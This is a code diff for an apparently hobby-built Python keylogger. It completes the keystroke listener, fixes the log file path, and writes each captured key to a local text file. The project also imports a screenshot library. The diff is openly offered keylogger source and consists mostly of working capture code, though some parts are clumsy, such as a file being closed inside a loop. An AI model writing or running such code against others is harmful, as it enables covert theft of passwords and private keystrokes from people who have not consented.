@@ -36,7 +36,7 @@ from PIL import ImageGrab  # screenshot library
 # Default Variables
 
 keys_information = "key_log.txt"
-path = "C:\\Users\\RAHUL\\Desktop\\KeyLogger\\Project"
+file_path = "C:\\Users\\RAHUL\\Desktop\\KeyLogger\\Project"
 extend = "\\"  # it will add a extra slash in the path so that we can access the key_log.txt file
 
 count = 0
@@ -50,14 +50,22 @@ def on_press(key):
     keys.append(key)
     count += 1
 
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys = []
+
 
 def write_file(keys):
-    with open(file_path, extend, keys_information, "a") as f:
+    with open(file_path + extend + keys_information, "a") as f:
         for key in keys:
             # it will remove the single quotes from the key so the key becomes readable
             k = str(key).replace("'", "")
             if k.find("space") > 0:  # it will find the space in the key
                 f.write('\n')
+                f.close()
+            elif k.find("Key") == -1:
+                f.write(k)
                 f.close()
 
 
@@ -66,4 +74,5 @@ def on_release(key):
         return False
 
 
-def
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
